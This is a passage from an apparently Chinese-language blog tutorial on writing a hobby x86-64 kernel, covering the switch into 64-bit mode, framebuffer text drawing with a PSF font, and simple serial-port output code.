gdt64_ptr - gdt64 - 1    # GDT limit<br>        .long gdt64                     # GDT Addr<br></code></pre></td></tr></table></figure><p>此时我们便来到了 64 位<strong>兼容模式</strong>，而要进入纯 64 位模式，则需要我们<strong>手动更新 CS 段选择子</strong>，这里笔者通过一个远跳转 <code>jmp</code> 指令<strong>手动指定段选择子的方式来刷新 CS 段选择子</strong></p><blockquote><p>以及别忘了刷新数据段选择子和其他段选择子，这些选择子可以直接通过寄存器进行重新赋值，<strong>但是 CS 段选择子必须通过指令进行刷新</strong></p></blockquote><p>从 <code>boot_main()</code> 开始我们就可以进入 C 语言的世界了：）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    # reload all the segment registers<br>    mov $(2 &lt;&lt; SELECTOR_INDEX), %ax<br>    mov     %ax, %ds<br>    mov     %ax, %ss<br>    mov     %ax, %es<br>    mov     %ax, %fs<br>    mov     %ax, %gs<br><br>    # enter the 64-bit world within a long jmp<br>    jmp $(1 &lt;&lt; SELECTOR_INDEX), $boot_main<br><br>    # we shouldn&#x27;t get here...<br>.loop:<br>    hlt<br>    jmp .loop<br></code></pre></td></tr></table></figure><blockquote><p>注：除了通过 <code>jmp 选择子:目标地址</code> 的方式以外，我们也可以通过 <code>lretq</code> 指令刷新 CS 段选择子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.code64<br>  pushq   $(1 &lt;&lt; SELECTOR_INDEX)<br>  pushq   $boot_main<br>  lretq<br></code></pre></td></tr></table></figure></blockquote><blockquote><h4 id="Extra-分段内存简介"><a href="#Extra-分段内存简介" class="headerlink" title="Extra. 分段内存简介"></a>Extra. 分段内存简介</h4><p>在古老的 16 位与 32 位运行模式下，x86 有一种管理内存的办法叫做<strong>分段</strong>（Segment），一个段便是一段连续内存，相应地有 cs、ds 等段寄存器用来指示不同用途的段，经过分段映射的地址称为逻辑地址（logical address）</p><p>16 位下段寄存器中直接存放段基址与段界限信息，32 位下段描述符扩展为 8 字节，存放在内存中一个名为段描述符表的结构中，GDTR 寄存器用来存放全局段描述符表的地址，相应地段寄存器中存放的变为段选择子（segment selector），指示了该段寄存器对应的段在段描述符表中的索引、权限等信息</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129183708.png"></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129184644.png" alt="32 位下的段描述符"></p><p>不过分段内存模式过于鸡肋，现代操作系统通常会选择把所有段都初始化为整个内存，因此 CPU 厂商更改了设计，在 64 位下默认不使用分段特性，不过 <em>也不是完全弃用分段这一特性</em> （尾大不掉属于是）</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129184734.png" alt="64 位下的段描述符"></p></blockquote><h2 id="boot-tty-c：读写-frame-buffer-进行文字输出"><a href="#boot-tty-c：读写-frame-buffer-进行文字输出" class="headerlink" title="boot_tty.c：读写 frame buffer 进行文字输出"></a>boot_tty.c：读写 frame buffer 进行文字输出</h2><p>熟悉各类操作系统开发教程的小伙伴肯定知道非常经典的读写 <code>0xB8000</code> 这块内存便能在屏幕上进行字体输出， <strong>但是在 UEFI 启动下这个方法已经不在可用</strong> ，那么我们该怎么进行字体输出呢？最简单的办法自然是——<strong>把像素点直接画在屏幕上</strong></p><h3 id="①-Frame-Buffer"><a href="#①-Frame-Buffer" class="headerlink" title="① Frame Buffer"></a>① Frame Buffer</h3><p><strong>帧缓冲区</strong> （ <strong>frame buffer</strong> ）为内存&#x2F;显存中的一块自定义区域，可以简单理解为屏幕上所显示内容的缓存，显卡会定期从这块区域搬运数据到显示设备上，因此我们可以通过读写 frame buffer 的方式来在显示器的指定位置显示指定的像素点</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129185224.png"></p><p>有了 Multiboot2 规范，我们可以指示 GRUB2 帮我们准备 Frame buffer 的相关信息并传递给我们的内核，接下来我们便能通过直接读写 frame buffer 对应内存的方式来直接在屏幕上进行显示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* frame buffer info */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> *framebuffer_base; <span class="hljs-comment">/* 32 bit color */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> framebuffer_width;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> framebuffer_height;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_clear_screen_internal_fb</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> y = <span class="hljs-number">0</span>; y &lt; framebuffer_height; y++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> x = <span class="hljs-number">0</span>; x &lt; framebuffer_width; x++) &#123;<br>            framebuffer_base[y * framebuffer_width + x] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">boot_get_frame_buffer</span><span class="hljs-params">(<span class="hljs-type">multiboot_uint8_t</span> *mbi)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">multiboot_tag_framebuffer</span> *<span class="hljs-title">fb_info</span> =</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">multiboot_tag</span> *<span class="hljs-title">tag</span> =</span> (<span class="hljs-keyword">struct</span> multiboot_tag *) (mbi + <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* find framebuffer tag */</span><br>    <span class="hljs-keyword">if</span> (tag == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (tag-&gt;type != MULTIBOOT_TAG_TYPE_END) &#123;<br>        <span class="hljs-keyword">if</span> (tag-&gt;type == MULTIBOOT_TAG_TYPE_FRAMEBUFFER) &#123;<br>            fb_info = (<span class="hljs-keyword">struct</span> multiboot_tag_framebuffer*) tag;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        tag = (<span class="hljs-keyword">struct</span> multiboot_tag *) \<br>              ((<span class="hljs-type">multiboot_uint8_t</span> *) tag + ((tag-&gt;size + <span class="hljs-number">7</span>) &amp; ~<span class="hljs-number">7</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fb_info == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    framebuffer_base = (<span class="hljs-type">uint32_t</span>*) fb_info-&gt;common.framebuffer_addr;<br>    framebuffer_height = fb_info-&gt;common.framebuffer_height;<br>    framebuffer_width = fb_info-&gt;common.framebuffer_width;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="②-字体解析绘制"><a href="#②-字体解析绘制" class="headerlink" title="② 字体解析绘制"></a>② 字体解析绘制</h3><p>虽然我们现在可以通过直接操作 Frame buffer 来绘制图形，但是每个字体都要从零开始绘制的话未免就太麻烦了一点，因此我们选择载入现有的 <strong>PC Screen Font</strong> 格式的字体文件，从中读取相应的字体信息进行绘制</p><blockquote><p>这里字体笔者选择了 <a href="https://github.com/talamus/solarize-12x29-psf/">solarize-12x29</a>，clone 到本地后将 <code>Solarize.12x29.psf</code> 拷贝为 <code>arch/x86/boot/font.psf</code> 即可</p></blockquote><p>由于我们还没建立文件系统，因此我们需要将字体文件直接链接到内核当中，这里可以使用 <code>objcopy</code> 这一工具来将字体文件转换为可链接文件：</p><blockquote><p>需要注意的是，<strong>objcopy 会非常 sb 地把路径名也放进去</strong>，因此比较可行的解决方案就是<strong>提前将字体文件转换为 .o 文件</strong></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">objcopy -O elf64-x86-64 -B i386 -I binary font.psf boot_font.o</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">objdump -t boot_font.o</span><br><br>boot_font.o:     file format elf64-x86-64<br><br>SYMBOL TABLE:<br>0000000000000000 g       .data  0000000000000000 _binary_font_psf_start<br>0000000000007420 g       .data  0000000000000000 _binary_font_psf_end<br>0000000000007420 g       *ABS*  0000000000000000 _binary_font_psf_size<br></code></pre></td></tr></table></figure><p>现在我们来看如何解析这一格式的字体，PSF 有两版规范，由一个 header 来指示字体基本信息， header 之后便是字体的位图信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PSF1_FONT_MAGIC 0x0436</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">psf1_header</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> magic;     <span class="hljs-comment">/* magic number for identification */</span><br>    <span class="hljs-type">uint8_t</span> font_mode;  <span class="hljs-comment">/* PSF font mode */</span><br>    <span class="hljs-type">uint8_t</span> char_size;  <span class="hljs-comment">/* PSF char size */</span><br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PSF2_FONT_MAGIC 0x864ab572</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">psf2_header</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> magic;             <span class="hljs-comment">/* magic number for PSF */</span><br>    <span class="hljs-type">uint32_t</span> version;           <span class="hljs-comment">/* zero */</span><br>    <span class="hljs-type">uint32_t</span> header_size;       <span class="hljs-comment">/* offset of bitmaps in file, 32 */</span><br>    <span class="hljs-type">uint32_t</span> flags;             <span class="hljs-comment">/* 0 if there&#x27;s no unicode table */</span><br>    <span class="hljs-type">uint32_t</span> glyph_nr;          <span class="hljs-comment">/* number of glyphs */</span><br>    <span class="hljs-type">uint32_t</span> bytes_per_glyph;   <span class="hljs-comment">/* size of each glyph */</span><br>    <span class="hljs-type">uint32_t</span> height;            <span class="hljs-comment">/* height in pixels */</span><br>    <span class="hljs-type">uint32_t</span> width;             <span class="hljs-comment">/* width in pixels */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>字体位图有着其固定的宽度与高度，虽然字体的宽度并不一定对齐到 8 bit，但是存储空间需要对齐到 8 bit 也就是 1 字节，因此<strong>位图数据中会有空数据填充段</strong>，以一个 12x12 的 PSF 位图为示例：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dns">           padding<br> Font data    |<br>+----------+ +--+<br><span class="hljs-number">000001100000</span> <span class="hljs-number">0000</span><br><span class="hljs-number">000011110000</span> <span class="hljs-number">0000</span><br><span class="hljs-number">000110011000</span> <span class="hljs-number">0000</span><br><span class="hljs-number">001100001100</span> <span class="hljs-number">0000</span><br><span class="hljs-number">011000000110</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">111111111111</span> <span class="hljs-number">0000</span><br><span class="hljs-number">111111111111</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br><span class="hljs-number">110000000011</span> <span class="hljs-number">0000</span><br></code></pre></td></tr></table></figure><p>由此我们可以通过如下代码来解析字体文件并在屏幕上显示文字（二代规范）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> _binary_font_psf_start[];<br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> _binary_font_psf_end[];<br><br><span class="hljs-comment">/* char output info */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> fb_cursor_x, fb_cursor_y;    <span class="hljs-comment">/* count by chars */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> max_ch_nr_x, max_ch_nr_y;<br><br><span class="hljs-comment">/* font info */</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">psf2_header</span> *<span class="hljs-title">boot_font</span>;</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> font_width, font_height;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> font_width_bytes;<br><span class="hljs-type">static</span> <span class="hljs-type">uint8_t</span> *glyph_table;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> bytes_per_glyph, glyph_nr;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_putchar_fb_new_line</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> bg)</span><br>&#123;<br>    fb_cursor_x = <span class="hljs-number">0</span>;<br>    fb_cursor_y++;<br>    <br>    <span class="hljs-comment">/* we may need to scroll up */</span><br>    <span class="hljs-keyword">if</span> (fb_cursor_y &gt;= max_ch_nr_y) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> y = <span class="hljs-number">0</span>; y &lt; ((max_ch_nr_y - <span class="hljs-number">1</span>) * font_height); y++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> x = <span class="hljs-number">0</span>; x &lt; framebuffer_width; x++) &#123;<br>                framebuffer_base[x + y * framebuffer_width] = <br>                framebuffer_base[x + (y + font_height) * framebuffer_width];<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> y = <span class="hljs-number">0</span>; y &lt; font_height; y++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> x = <span class="hljs-number">0</span>; x &lt; framebuffer_width; x++) &#123;<br>                <span class="hljs-type">size_t</span> lines = (y + (max_ch_nr_y - <span class="hljs-number">1</span>) * font_height);<br>                <span class="hljs-type">size_t</span> loc = lines * framebuffer_width + x;<br>                framebuffer_base[loc] = bg;<br>            &#125;<br>        &#125;<br><br>        fb_cursor_y--;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_putchar_fb</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> ch, <span class="hljs-type">uint32_t</span> fg, <span class="hljs-type">uint32_t</span> bg)</span><br>&#123;<br>    <span class="hljs-type">uint8_t</span> *glyph = glyph_table;<br>    <span class="hljs-type">size_t</span> loc;<br><br>    <span class="hljs-comment">/* if char out of range, output null */</span><br>    <span class="hljs-keyword">if</span> (ch &lt; glyph_nr) &#123;<br>        glyph += ch * bytes_per_glyph;<br>    &#125;<br><br>    loc =  fb_cursor_y * font_height * framebuffer_width;<br>    loc += fb_cursor_x * font_width;<br><br>    <span class="hljs-comment">/* output the font to frame buffer */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> ch_y = <span class="hljs-number">0</span>; ch_y &lt; font_height; ch_y++) &#123;<br>        <span class="hljs-type">uint8_t</span> mask = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">7</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> ch_x = <span class="hljs-number">0</span>; ch_x &lt; font_width; ch_x++) &#123;<br>            <span class="hljs-keyword">if</span> ((*(glyph + ch_x / <span class="hljs-number">8</span>) &amp; mask) != <span class="hljs-number">0</span>) &#123;<br>                framebuffer_base[loc + ch_y * framebuffer_width + ch_x] = fg;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                framebuffer_base[loc + ch_y * framebuffer_width + ch_x] = bg;<br>            &#125;<br><br>            mask &gt;&gt;= <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (ch_x % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>                mask = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">7</span>;<br>            &#125;<br>        &#125;<br><br>        glyph += font_width_bytes;<br>    &#125;<br><br>    <span class="hljs-comment">/* move cursor */</span><br>    fb_cursor_x++;<br><br>    <span class="hljs-comment">/* we may need to move to new line */</span><br>    <span class="hljs-keyword">if</span> (fb_cursor_x &gt;= max_ch_nr_x) &#123;<br>        boot_putchar_fb_new_line(bg);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_init_font</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    boot_font = (<span class="hljs-keyword">struct</span> psf2_header*) _binary_font_psf_start;<br><br>    font_width_bytes = (boot_font-&gt;width + <span class="hljs-number">7</span>) / <span class="hljs-number">8</span>;<br>    font_width = font_width_bytes * <span class="hljs-number">8</span>;<br>    font_height = boot_font-&gt;height;<br><br>    glyph_table = (<span class="hljs-type">uint8_t</span>*)_binary_font_psf_start+boot_font-&gt;header_size;<br>    glyph_nr = boot_font-&gt;glyph_nr;<br>    bytes_per_glyph = boot_font-&gt;bytes_per_glyph;<br><br>    fb_cursor_x = fb_cursor_y = <span class="hljs-number">0</span>;<br>    max_ch_nr_x = framebuffer_width / font_width;<br>    max_ch_nr_y = framebuffer_height / font_height;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Extra：-串口输出初探"><a href="#Extra：-串口输出初探" class="headerlink" title="Extra： 串口输出初探"></a><em>Extra： 串口输出初探</em></h3><blockquote><p>注，因为我们目前处在 boot 部分，因此笔者仅会实现一个最简陋的串口输出代码，在后续的 real kernel 部分的代码中我们会重新实现一个更加完备的串口驱动</p></blockquote><p>串口输出是以前老 IBM 机喜欢用的方法，包括 Linux kernel 也支持串口输出功能（当你使用 qemu 运行时若添加了 <code>-nographic</code> 参数 QEMU 会将虚拟机的串口 0 的输出重定向到当前终端，也可以直接在 qemu 的图形界面切换到 <code>serial 0</code>），目前这个输出方式已经很少被使用了， <del>毕竟都什么年代了还在抽传统香烟？</del> 不过在一些特殊场景这个方法还是偶尔会被用到的（例如 headless console），因此这一节我们简单讲讲如何通过串口进行字符输出</p><p><strong>串行通讯端口</strong> （Serial Port，aka COM）通常由 <em>通用异步收发传输器</em> （Universal Asynchronous Receiver&#x2F;Transmitter， UART）进行控制，其内部时钟波特率通常是 115200，目前比较常用的是 <a href="https://gunkies.org/wiki/EIA_RS-232_serial_line_interface">EIA-RS-232</a> 标准，针脚数通常是 25 针或 9 针（后者用的比较多）</p><p><img src="https://s2.loli.net/2024/06/12/jUkhowJWRO67bHg.png" alt="25 针与 9 针"></p><blockquote><p>更多的微机原理知识这里不再赘叙，我们接下来简单讲讲串口如何使用</p></blockquote><p>单个串口的 <em>寄存器组</em> 会被映射到指定的 IO port 起始的区域，我们通过访问串口的不同寄存器进行相应的操作，通常情况下串口映射到端口的<strong>基地址</strong>如下：</p><blockquote><p>需要注意的是 <em>仅有前两个串口的端口地址是固定不变的，其余串口的端口地址未必如下表所示</em>  </p><p>对于守旧的 BIOS 用户，<a href="https://www.cs.yale.edu/flint/feng/cos/resources/BIOS/Resources/biosdata.htm">BIOS Data Area</a> 可以帮助你获取包括 COM 地址在内的各种信息</p><p>对于 <del>不抽传统香烟的</del> 现代 UEFI 用户，</p></blockquote><table><thead><tr><th>COM Port</th><th>IO Port Base</th></tr></thead><tbody><tr><td>COM1</td><td>0x3F8</td></tr><tr><td>COM2</td><td>0x2F8</td></tr><tr><td>COM3</td><td>0x3E8</td></tr><tr><td>COM4</td><td>0x2E8</td></tr><tr><td>COM5</td><td>0x5F8</td></tr><tr><td>COM6</td><td>0x4F8</td></tr><tr><td>COM7</td><td>0x5E8</td></tr><tr><td>COM8</td><td>0x4E8</td></tr></tbody></table><p>不同偏移的寄存器含义如下（来自 <a href="https://wiki.osdev.org/Serial_Ports">OSDEV wiki</a>）：</p><table><thead><tr><th>IO Port Offset</th><th>Setting of DLAB</th><th>I&#x2F;O Access</th><th>Register mapped to this port</th></tr></thead><tbody><tr><td>+0</td><td>0</td><td>Read</td><td>Receive buffer.</td></tr><tr><td>+0</td><td>0</td><td>Write</td><td>Transmit buffer.</td></tr><tr><td>+1</td><td>0</td><td>Read&#x2F;Write</td><td>Interrupt Enable Register.</td></tr><tr><td>+0</td><td>1</td><td>Read&#x2F;Write</td><td>With DLAB set to 1, this is the least significant byte of the divisor value for setting the baud rate.</td></tr><tr><td>+1</td><td>1</td><td>Read&#x2F;Write</td><td>With DLAB set to 1, this is the most significant byte of the divisor value.</td></tr><tr><td>+2</td><td>-</td><td>Read</td><td>Interrupt Identification</td></tr><tr><td>+2</td><td>-</td><td>Write</td><td>FIFO control registers</td></tr><tr><td>+3</td><td>-</td><td>Read&#x2F;Write</td><td>Line Control Register. The most significant bit of this register is the DLAB.</td></tr><tr><td>+4</td><td>-</td><td>Read&#x2F;Write</td><td>Modem Control Register.</td></tr><tr><td>+5</td><td>-</td><td>Read</td><td>Line Status Register.</td></tr><tr><td>+6</td><td>-</td><td>Read</td><td>Modem Status Register.</td></tr><tr><td>+7</td><td>-</td><td>Read&#x2F;Write</td><td>Scratch Register.</td></tr></tbody></table><p>方便起见，在启动阶段我们就不编写太过于复杂的串口驱动了，简单来说，要通过串口进行字符输出，我们首先需要往一部分寄存器中写入特定数据进行串口初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">boot_init_com_internal</span><span class="hljs-params">(<span class="hljs-type">size_t</span> base_port)</span><br>&#123;<br>    <span class="hljs-comment">/* disable all interrupts */</span><br>    outb(base_port + COM_REG_IER, <span class="hljs-number">0x00</span>);<br><br>    <span class="hljs-comment">/* enable DLAB to set bound rate divisor */</span><br>    outb(base_port + COM_REG_LCR, <span class="hljs-number">0x80</span>);<br><br>    <span class="hljs-comment">/* set divisor to 38400 baud */</span><br>    outb(base_port + COM_REG_DLL, <span class="hljs-number">0x03</span>);<br>    outb(base_port + COM_REG_DLM, <span class="hljs-number">0x00</span>);<br><br>    <span class="hljs-comment">/* 8 data bits, parity off, 1 stop bit, DLAB latch off */</span><br>    outb(base_port + COM_REG_LCR, <span class="hljs-number">0x03</span>);<br><br>    <span class="hljs-comment">/* enable FIFO */</span><br>    outb(base_port + COM_REG_FCR, <span class="hljs-number">0xC7</span>);<br>    <br>    <span class="hljs-comment">/* enable IRQs, set RTS/DSR */</span><br>    outb(base_port + COM_REG_MCR, <span class="hljs-number">0x0B</span>);<br><br>    <span class="hljs-comment">/* set in loopback mode and test serial chip */</span><br>    outb(base_port + COM_REG_MCR, <span class="hljs-number">0x1E</span>);<br><br>    <span class="hljs-comment">/* write a byte to test serial chip */</span><br>    outb(base_port + COM_REG_TX, <span class="hljs-string">&quot;arttnba3&quot;</span>[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-comment">/* check if serial is faulty */</span><br>    <span class="hljs-keyword">if</span> (inb(base_port + COM_REG_RX) != <span class="hljs-string">&quot;arttnba3&quot;</span>[<span class="hljs-number">0</span>]) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* set in normal mode */</span><br>    outb(base_port + COM_REG_MCR, <span class="hljs-number">0x0F</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后直接往串口里 <code>outb()</code> 即可输出字符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_putchar_com</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> ch)</span><br>&#123;<br>    <span class="hljs-type">uint8_t</span> res;<br><br>    <span 